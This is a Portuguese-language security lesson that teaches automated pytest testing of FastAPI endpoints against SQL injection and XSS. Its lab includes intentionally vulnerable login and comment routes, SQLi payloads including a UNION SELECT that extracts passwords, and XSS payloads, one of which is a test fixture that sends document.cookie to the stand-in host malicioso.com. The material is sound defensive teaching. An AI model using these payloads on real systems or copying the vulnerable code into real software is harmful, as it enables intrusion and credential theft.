# Testes Práticos contra Injeção de SQL e XSS em APIs

Simulação ofensiva controlada, identificação de vulnerabilidades em códigos gerados por IA e automação de testes com `pytest` e `TestClient` no FastAPI.

## Objetivos da Aula

### O que você vai aprender

* Compreender a mecânica técnica e os impactos da Injeção de SQL (SQL Injection - SQLi) e do Cross-Site Scripting (XSS) segundo as diretrizes da OWASP.

* Reconhecer padrões vulneráveis gerados frequentemente por Inteligência Artificial Generativa em rotinas de autenticação e manipulação de texto.

* Estruturar testes ofensivos automatizados utilizando o framework `pytest` e a biblioteca `TestClient` do FastAPI.

* Aplicar o padrão AAA (Arrange, Act, Assert) para formular asserções de segurança rigorosas.

* Mitigar vulnerabilidades aplicando consultas parametrizadas (Prepared Statements) e sanitização contextual de dados.

* Executar o laboratório prático refatorando uma API vulnerável até a aprovação integral da suíte de segurança.

## A Anatomia da Injeção de SQL (SQL Injection)

A Injeção de SQL ocorre quando dados fornecidos por usuários não confiáveis são concatenados diretamente na composição de uma instrução SQL enviada ao interpretador do banco de dados, sem validação ou escape prévio.

Essa falha enquadra-se na categoria **A03: Injection** do OWASP Top 10 e viola diretamente as subcaracterísticas de Confidencialidade e Integridade da norma ISO/IEC 25010.

### Vetor de Ataque de Injeção de SQL

```
[ Usuário envia payload malicioso: ' OR '1'='1 ]
                     │
                     ▼
[ API concatena entrada diretamente na query SQL ]
                     │
                     ▼
[ Interpretador SQL altera a lógica da consulta ]
                     │
                     ▼
[ Cláusula WHERE torna-se sempre verdadeira ]
                     │
                     ▼
[ Autenticação é burlada ou dados sigilosos são expostos ]


```

### O Padrão Vulnerável Gerado por IA

Ao solicitar a uma ferramenta de IA a criação de uma rotina rápida de login com SQLite, é recorrente a geração de códigos como este:

```
# CODIGO VULNERAVEL: Interpolação direta de parâmetros
@app.post("/api/v1/auth/login")
def login(dados: Credenciais):
    # A IA utiliza f-string para montar o comando SQL
    query = (
        f"SELECT id, nome, perfil FROM usuarios "
        f"WHERE email = '{dados.email}' AND senha = '{dados.senha}'"
    )
    cursor.execute(query)
    usuario = cursor.fetchone()
    return usuario


```

### O Mecanismo do Ataque

Se o atacante submeter no campo `email` a carga `' OR '1'='1 --`, a string resultante montada pelo servidor será:

$$
\text{SELECT id, nome, perfil FROM usuarios WHERE email = '' OR '1'='1 } \text{--' AND senha = '...'}
$$

Como `'1'='1'` é uma condição invariavelmente verdadeira e os dois hífens (`--`) comentam o restante da consulta (anulando a verificação da senha), o banco de dados retorna imediatamente o primeiro registro da tabela de usuários (frequentemente a conta de administrador), concedendo acesso indevido ao atacante.

### A Solução Segura: Consultas Parametrizadas (Prepared Statements)

A mitigação definitiva contra SQL Injection consiste em dissociar a estrutura do comando SQL dos dados enviados pelo usuário, utilizando parâmetros posicionais:

```
# CODIGO SEGURO: Uso de parâmetros vinculados (Prepared Statements)
@app.post("/api/v1/auth/login")
def login(dados: Credenciais):
    # O interpretador trata os dados exclusivamente como valores literais
    query = "SELECT id, nome, perfil FROM usuarios WHERE email = ? AND senha = ?"
    cursor.execute(query, (dados.email, dados.senha))
    usuario = cursor.fetchone()
    return usuario


```

Nesse formato seguro, mesmo que o valor de `dados.email` contenha aspas ou instruções SQL, o mecanismo de banco de dados trata toda a cadeia de caracteres como um texto literal, impossibilitando a alteração da lógica da instrução.

## A Anatomia do Cross-Site Scripting (XSS)

O Cross-Site Scripting (XSS) é uma vulnerabilidade em que scripts maliciosos (geralmente em JavaScript) são injetados em aplicações web confiáveis. Quando outro usuário acessa a página ou consome o dado afetado, o navegador executa o script no contexto da sessão da vítima.

O XSS permite que atacantes roubem cookies de sessão, sequestrem credenciais e executem ações não autorizadas em nome da vítima.

```
[ Atacante envia script malicioso ]
                     │
                     ▼
[ API armazena ou reflete sem sanitização ]
                     │
                     ▼
[ Navegador da Vítima requisita os dados ]
                     │
                     ▼
[ Navegador executa o JavaScript malicioso ]
                     │
                     ▼
[ Cookies e tokens enviados ao atacante ]


```

### Classificação dos Tipos de XSS

1. **XSS Armazenado (Stored / Persistent XSS):** O código malicioso é persistido permanentemente no banco de dados da aplicação (por exemplo, no campo de comentário de um projeto ou na biografia de um voluntário). Toda vez que qualquer usuário visualiza aquele registro, o script é executado em seu navegador.

2. **XSS Refletido (Reflected XSS):** O payload malicioso trafega na própria requisição HTTP (frequentemente em parâmetros de busca na URL) e é imediatamente refletido na resposta do servidor sem higienização.

3. **XSS Baseado no DOM (DOM-based XSS):** A vulnerabilidade reside inteiramente no código JavaScript do lado do cliente, que manipula dados não confiáveis inserindo-os diretamente no DOM (por meio de propriedades como `innerHTML`).

### O Padrão Vulnerável Gerado por IA

Ferramentas de IA costumam produzir rotinas que devolvem respostas formatadas ou interpoladas diretamente sem validação de caracteres perigosos:

```
# CODIGO VULNERAVEL: Retorno de dados sem codificação de entidades
@app.post("/api/v1/mensagens")
def registrar_mensagem(mensagem: str):
    # Se o texto contiver <script>alert('XSS')</script>,
    # ele será armazenado exatamente assim no banco de dados
    cursor.execute("INSERT INTO mensagens (texto) VALUES (?)", (mensagem,))
    return {"status": "ok", "mensagem_recebida": mensagem}


```

### A Solução Segura: Sanitização e Codificação de Entidades (HTML Escaping)

Para impedir que caracteres especiais sejam interpretados como elementos executáveis pelo navegador, a aplicação deve codificar caracteres reservados para suas respectivas entidades HTML:

* `<` torna-se `&lt;`

* `>` torna-se `&gt;`

* `&` torna-se `&amp;`

* `"` torna-se `&quot;`

* `'` torna-se `&#x27;`

Em Python, a biblioteca padrão disponibiliza o módulo `html.escape()`:

```
import html

# CODIGO SEGURO: Codificação defensiva de saída
texto_bruto = "<script>alert('XSS')</script>"
texto_seguro = html.escape(texto_bruto)
# Resultado: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;


```

## Engenharia de Testes de Segurança com Pytest

Na engenharia de testes de software, testes de segurança automatizados funcionam como guardiões contínuos. Enquanto os testes funcionais verificam se o sistema faz o que deve fazer, os testes de segurança verificam se o sistema **não faz** o que não deve fazer.

### Estruturação de Casos de Teste com o Padrão AAA

Para garantir legibilidade e manutenção, os testes ofensivos adotam o padrão **Arrange, Act, Assert**:

```
import pytest
from fastapi.testclient import TestClient

@pytest.mark.security
def test_deve_rejeitar_injecao_sql_no_login(cliente_api: TestClient):
    # 1. ARRANGE (Preparação): Construção do payload malicioso
    payload_ofensivo = {
        "email": "' OR '1'='1' --",
        "senha": "qualquer_senha"
    }

    # 2. ACT (Ação): Envio da requisição hostil para o endpoint
    resposta = cliente_api.post("/api/v1/auth/login", json=payload_ofensivo)

    # 3. ASSERT (Asserção): O sistema DEVE barrar o acesso indevido
    assert resposta.status_code == 401, "A API concedeu acesso indevido com SQL Injection!"
    assert "token" not in resposta.json(), "Token de acesso foi gerado para carga maliciosa!"


```

## Laboratório Prático: O Caso da API Solidária Vulnerável

Neste laboratório, investigaremos a API de arrecadação do *Hub Solidário*. A primeira versão do código foi gerada com o auxílio de IA e implantada com sérias vulnerabilidades de injeção.

Nosso objetivo é auditar as falhas por meio de testes automatizados e refatorar a aplicação até obter 100% de conformidade com as diretrizes da OWASP.

### Passo 1: Configuração do Ambiente com `uv`

Crie o diretório do projeto e inicialize o ambiente:

```
uv init lab-seguranca-owasp
cd lab-seguranca-owasp
uv add fastapi uvicorn pytest httpx pydantic


```

Em seguida, adicione a seção de configuração do pytest ao final do arquivo `pyproject.toml` para registrar a marcação customizada `@pytest.mark.security` e filtrar avisos de depreciação do interpretador:

```
[tool.pytest.ini_options]
markers = [
    "security: testes de seguranca ofensiva e defensiva (OWASP)",
]
filterwarnings = [
    "ignore::DeprecationWarning",
    "ignore:.*testclient.*:Warning",
]


```

> **Registro de Marcadores no Pytest:** O pytest valida rigorosamente todos os decoradores de marcação. Quando utilizamos `@pytest.mark.security`, o registro explícito em `[tool.pytest.ini_options]` evita o aviso `PytestUnknownMarkWarning`, mantendo a saída do terminal limpa e padronizada.

### Passo 2: A API com Código Vulnerável Gerado por IA

Crie o arquivo `main.py` contendo a implementação inicial da API com as rotas vulneráveis e as rotas seguras para comparação didática:

```
"""
API do Hub Solidário com demonstração comparativa de vulnerabilidades e correções.
"""

import html
import sqlite3
from fastapi import FastAPI, HTTPException, status
from pydantic import BaseModel, EmailStr

app = FastAPI(title="Hub Solidario - Laboratorio de Seguranca")


def obter_banco():
    """Gera conexão com banco SQLite em memória com dados pré-carregados."""
    conn = sqlite3.connect(":memory:", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS usuarios (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nome TEXT NOT NULL,
            email TEXT UNIQUE NOT NULL,
            senha TEXT NOT NULL,
            is_admin BOOLEAN NOT NULL
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS comentarios (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            autor TEXT NOT NULL,
            conteudo TEXT NOT NULL
        )
    """)
    # Inserção de dados iniciais de teste
    cursor.execute("""
        INSERT INTO usuarios (nome, email, senha, is_admin)
        VALUES 
            ('Administrador', 'admin@hubsolidario.org', 'segredo_admin_123', 1),
            ('Voluntario Lucas', 'lucas@voluntariado.org', 'senha_lucas_456', 0)
    """)
    conn.commit()
    return conn


db = obter_banco()


class RequisicaoLogin(BaseModel):
    email: str
    senha: str


class RequisicaoComentario(BaseModel):
    autor: str
    conteudo: str


# ==============================================================================
# ENDPOINTS INTENCIONALMENTE VULNERAVEIS (GERADOS POR IA SEM REVISÃO)
# ==============================================================================

@app.post("/vulneravel/login")
def login_vulneravel(dados: RequisicaoLogin):
    """
    VULNERABILIDADE: SQL Injection (OWASP A03).
    A IA concatenou os parâmetros diretamente na consulta SQL via f-string.
    """
    cursor = db.cursor()
    query = f"SELECT id, nome, email, is_admin FROM usuarios WHERE email = '{dados.email}' AND senha = '{dados.senha}'"
    cursor.execute(query)
    usuario = cursor.fetchone()

    if not usuario:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Credenciais invalidas"
        )

    return {
        "id": usuario[0],
        "nome": usuario[1],
        "email": usuario[2],
        "is_admin": bool(usuario[3]),
        "status": "Autenticado com sucesso"
    }


@app.post("/vulneravel/comentarios")
def comentar_vulneravel(dados: RequisicaoComentario):
    """
    VULNERABILIDADE: Stored XSS (OWASP A03 / LLM02).
    A IA persistiu e refletiu conteúdo HTML bruto sem qualquer sanitização.
    """
    cursor = db.cursor()
    cursor.execute(
        "INSERT INTO comentarios (autor, conteudo) VALUES (?, ?)",
        (dados.autor, dados.conteudo)
    )
    db.commit()

    return {
        "autor": dados.autor,
        "conteudo": dados.conteudo,
        "aviso": "Comentario registrado sem higienizacao"
    }


# ==============================================================================
# ENDPOINTS SEGUROS (REFATORADOS EM CONFORMIDADE COM A OWASP)
# ==============================================================================

@app.post("/seguro/login")
def login_seguro(dados: RequisicaoLogin):
    """
    PROTEÇÃO: Consultas Parametrizadas (Prepared Statements).
    O mecanismo de banco trata os parâmetros exclusivamente como literais.
    """
    cursor = db.cursor()
    query = "SELECT id, nome, email, is_admin FROM usuarios WHERE email = ? AND senha = ?"
    cursor.execute(query, (dados.email, dados.senha))
    usuario = cursor.fetchone()

    if not usuario:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Credenciais invalidas"
        )

    return {
        "id": usuario[0],
        "nome": usuario[1],
        "email": usuario[2],
        "is_admin": bool(usuario[3]),
        "status": "Autenticado com sucesso"
    }


@app.post("/seguro/comentarios")
def comentar_seguro(dados: RequisicaoComentario):
    """
    PROTEÇÃO: Sanitização com html.escape() e validação estrutural.
    Caracteres especiais como <, >, &, \" são convertidos em entidades seguras.
    """
    autor_seguro = html.escape(dados.autor.strip())
    conteudo_seguro = html.escape(dados.conteudo.strip())

    cursor = db.cursor()
    cursor.execute(
        "INSERT INTO comentarios (autor, conteudo) VALUES (?, ?)",
        (autor_seguro, conteudo_seguro)
    )
    db.commit()

    return {
        "autor": autor_seguro,
        "conteudo": conteudo_seguro,
        "aviso": "Comentario higienizado com sucesso"
    }


```

### Passo 3: Criação da Suíte de Testes Automatizados de Segurança

Crie a pasta `tests/` e adicione o arquivo `tests/test_seguranca.py`:

```
"""
Suíte de testes ofensivos e defensivos para validação de SQL Injection e XSS.
"""

import pytest
from fastapi.testclient import TestClient
from main import app

cliente = TestClient(app)


# ==============================================================================
# AUDITORIA OFENSIVA: PROVANDO AS VULNERABILIDADES NO ENDPOINT INSEGURO
# ==============================================================================

@pytest.mark.security
def test_deve_comprovar_vulnerabilidade_de_sql_injection():
    """
    Comprova que a rota vulneravel permite burlar a autenticacao
    e logar como administrador sem conhecer a senha.
    """
    # ARRANGE: Payload ofensivo clássico de subversão de cláusula WHERE
    payload_malicioso = {
        "email": "admin@hubsolidario.org' --",
        "senha": "senha_completamente_incorreta"
    }

    # ACT: Disparo da requisição maliciosa
    resposta = cliente.post("/vulneravel/login", json=payload_malicioso)

    # ASSERT: O endpoint vulnerável autentica indevidamente o invasor
    assert resposta.status_code == 200
    dados = resposta.json()
    assert dados["email"] == "admin@hubsolidario.org"
    assert dados["is_admin"] is True


@pytest.mark.security
def test_deve_comprovar_vulnerabilidade_de_xss():
    """
    Comprova que a rota vulneravel aceita tags de script executaveis sem escapar.
    """
    # ARRANGE: Payload malicioso de Cross-Site Scripting
    payload_xss = {
        "autor": "Atacante",
        "conteudo": "<script>fetch('http://malicioso.com?cookie=' + document.cookie)</script>"
    }

    # ACT: Envio do comentário
    resposta = cliente.post("/vulneravel/comentarios", json=payload_xss)

    # ASSERT: O endpoint vulnerável devolveu a tag <script> intacta
    assert resposta.status_code == 200
    assert "<script>" in resposta.json()["conteudo"]


# ==============================================================================
# AUDITORIA DEFENSIVA: COMPROVANDO A EFICÁCIA DA MITIGAÇÃO NO ENDPOINT SEGURO
# ==============================================================================

@pytest.mark.security
def test_endpoint_seguro_deve_bloquear_sql_injection():
    """
    Comprova que a rota segura barra a tentativa de SQL Injection
    retornando status HTTP 401 Unauthorized.
    """
    # ARRANGE
    payload_malicioso = {
        "email": "admin@hubsolidario.org' --",
        "senha": "senha_completamente_incorreta"
    }

    # ACT
    resposta = cliente.post("/seguro/login", json=payload_malicioso)

    # ASSERT
    assert resposta.status_code == 401
    assert resposta.json()["detail"] == "Credenciais invalidas"


@pytest.mark.security
def test_endpoint_seguro_deve_sanitizar_tags_xss():
    """
    Comprova que a rota segura sanitiza caracteres perigosos,
    convertendo tags executáveis em entidades HTML inofensivas.
    """
    # ARRANGE
    payload_xss = {
        "autor": "Atacante",
        "conteudo": "<script>alert('Ataque XSS')</script>"
    }

    # ACT
    resposta = cliente.post("/seguro/comentarios", json=payload_xss)

    # ASSERT
    assert resposta.status_code == 200
    conteudo_retornado = resposta.json()["conteudo"]
    assert "<script>" not in conteudo_retornado
    assert "&lt;script&gt;" in conteudo_retornado


```

### Passo 4: Execução dos Testes Ofensivos no Terminal

Execute a suíte de testes com o pytest:

```
uv run pytest -v


```

#### Saída Esperada no Terminal:

```
tests/test_seguranca.py::test_deve_comprovar_vulnerabilidade_de_sql_injection PASSED [ 25%]
tests/test_seguranca.py::test_deve_comprovar_vulnerabilidade_de_xss PASSED           [ 50%]
tests/test_seguranca.py::test_endpoint_seguro_deve_bloquear_sql_injection PASSED     [ 75%]
tests/test_seguranca.py::test_endpoint_seguro_deve_sanitizar_tags_xss PASSED         [100%]

============================== 4 passed in 0.42s ==============================


```

## Exercícios Práticos de Fixação

Os exercícios a seguir desafiam a identificar e refatorar novas variações de vulnerabilidades.

### Exercício 1: Ataque de SQL Injection para Extração de Dados via UNION SELECT

Em um endpoint de busca de campanhas solidárias `/vulneravel/campanhas/buscar?termo=`, a IA construiu a seguinte consulta vulnerável:

```
query = f"SELECT id, titulo, meta FROM campanhas WHERE titulo LIKE '%{termo}%'"


```

1. Formule um payload ofensivo utilizando a técnica `UNION SELECT` para forçar a API a retornar a listagem de usuários e senhas da tabela `usuarios`.

2. Escreva um caso de teste no `pytest` simulando esse ataque.

3. Refatore o endpoint para a versão segura utilizando parametrização com `LIKE ?`.

#### Gabarito e Implementação do Exercício 1

* **Payload Ofensivo:**

  ```
  %' UNION SELECT id, email, senha FROM usuarios --
  
  
  ```

* **Caso de Teste no Pytest:**

  ```
  @pytest.mark.security
  def test_deve_rejeitar_extracao_union_select():
      payload = "%' UNION SELECT id, email, senha FROM usuarios --"
      resposta = cliente.get(f"/seguro/campanhas/buscar?termo={payload}")
      assert resposta.status_code == 200
      # Nenhum dado de senha pode ter sido retornado
      for item in resposta.json():
          assert "segredo_admin_123" not in str(item)
  
  
  ```

* **Refatoração Segura com Prepared Statement:**

  ```
  @app.get("/seguro/campanhas/buscar")
  def buscar_campanhas_seguro(termo: str):
      cursor = db.cursor()
      query = "SELECT id, titulo, meta FROM campanhas WHERE titulo LIKE ?"
      cursor.execute(query, (f"%{termo}%",))
      return cursor.fetchall()
  
  
  ```

### Exercício 2: Sanitização Contra XSS em Atributos HTML (`onerror`)

Muitas ferramentas de IA implementam filtros ingênuos que apenas removem a palavra `script`. Demonstre como burlar esse filtro com um vetor baseado em tag de imagem e construa a asserção defensiva adequada.

#### Gabarito e Implementação do Exercício 2

* **Payload Alternativo:**

  ```
  <img src="invalido" onerror="alert('XSS executado sem tag script')">
  
  
  ```

* **Caso de Teste no Pytest:**

  ```
  @pytest.mark.security
  def test_deve_bloquear_xss_com_evento_onerror():
      payload = {
          "autor": "Invasor",
          "conteudo": '<img src="invalido" onerror="alert(1)">'
      }
      resposta = cliente.post("/seguro/comentarios", json=payload)
      conteudo = resposta.json()["conteudo"]
      assert "<img" not in conteudo
      assert "&lt;img" in conteudo
  
  
  ```

## Checkpoints de Autoavaliação do Laboratório

Antes de finalizar o projeto, verifique o cumprimento de todos os critérios de qualidade:

* \[ \] A conexão com o banco de dados SQLite não concatena strings diretamente em nenhuma consulta.

* \[ \] Todas as rotas de busca e login utilizam consultas parametrizadas (Prepared Statements com `?`).

* \[ \] Todo conteúdo textual fornecido por usuários é codificado com `html.escape()` antes da persistência ou reflexão na resposta.

* \[ \] Os testes utilizam o padrão AAA (Arrange, Act, Assert) com marcadores `@pytest.mark.security`.

* \[ \] As tentativas de exploração com cargas hostis retornam erros semânticos (ex: `401 Unauthorized`) sem vazar rastros de pilha (*stack traces*).

* \[ \] Todos os testes automatizados da suíte foram executados com `uv run pytest` e obtiveram aprovação com 100% de sucesso.

## Quizzes de Fixação

### Questão 1

Por que a concatenação direta de parâmetros de entrada em instruções SQL (ex: `f"SELECT * FROM usuarios WHERE id = '{id}'"`) é uma prática perigosa?

* \[ \] Porque o SQLite não aceita conexões assíncronas do FastAPI.

* \[ \] Porque converte automaticamente valores inteiros em ponto flutuante.

* \[ \] Porque degrada o consumo de memória do banco de dados relacional.

* \[x\] Porque permite que o usuário envie caracteres especiais (como aspas simples e comentários) que alteram a sintaxe e a lógica do interpretador SQL, executando instruções arbitrárias.

### Questão 2

Qual é o mecanismo técnico correto para prevenir completamente vulnerabilidades de Injeção de SQL em aplicações com banco relacional?

* \[ \] Substituir todas as aspas simples por aspas duplas no código Python.

* \[x\] Utilizar Consultas Parametrizadas (Prepared Statements), nas quais os dados do usuário são enviados separadamente e tratados exclusivamente como valores literais pelo banco de dados.

* \[ \] Desabilitar o suporte a transações no servidor de banco de dados.

* \[ \] Adicionar um middleware de CORS permitindo qualquer origem.

### Questão 3

Qual é a principal diferença entre o XSS Armazenado (Stored XSS) e o XSS Refletido (Reflected XSS)?

* \[ \] O XSS Refletido exige privilégios de superadministrador para ser executado.

* \[ \] O XSS Armazenado ocorre apenas quando há falhas em conexões HTTPS.

* \[ \] O XSS Armazenado só funciona no ambiente Linux, enquanto o XSS Refletido ocorre em navegadores móveis.

* \[x\] No XSS Armazenado, o script malicioso é persistido no banco de dados e afeta qualquer usuário que visualize aquele registro posteriormente; no XSS Refletido, o payload viaja na requisição atual e é devolvido imediatamente na resposta do servidor.

### Questão 4

Em uma suíte de testes de segurança automatizada com o pytest, qual deve ser a asserção esperada ao enviar uma carga de injeção de SQL (`' OR '1'='1`) para o endpoint de autenticação de uma API segura?

* \[x\] Status HTTP 401 Unauthorized rejeitando categoricamente o login.

* \[ \] Status HTTP 500 Internal Server Error contendo o dump de variáveis do banco.

* \[ \] Status HTTP 200 OK com token JWT válido de administrador.

* \[ \] Retorno de uma página HTML em branco sem cabeçalhos HTTP.

[Voltar para o topo](#testes-práticos-contra-injeção-de-sql-e-xss-em-apis)

*Made with Material for MkDocs*